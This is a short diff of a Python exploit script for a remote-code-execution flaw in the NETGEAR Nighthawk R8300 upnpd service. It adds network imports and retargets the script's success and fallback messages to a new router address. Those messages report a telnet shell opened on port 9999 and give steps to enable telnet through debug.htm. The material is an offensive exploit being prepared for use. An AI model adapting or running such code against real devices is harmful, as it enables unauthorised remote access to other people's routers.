@@ -1,5 +1,6 @@
-import sys
 from struct import pack
+import socket
+import time
 
 a = """
   # NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130
@@ -176,12 +177,12 @@ time.sleep(5)
 
 if checkExploit():
    print "[*] Exploit Success"
-   print "[*] You can access telnet 192.168.1.1 9999"
+   print "[*] You can access telnet 192.168.2.2 9999"
 else:
    print "[*] Need to Existed Address cross each other"
    print "[*] You need to reboot or execute upnpd daemon to execute upnpd"
    print "[*] To exploit reexecute upnpd, description"
-   print "[*] Access http://192.168.1.1/debug.htm and enable telnet"
+   print "[*] Access http://192.168.2.2/debug.htm and enable telnet"
    print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"
 
 s.close()
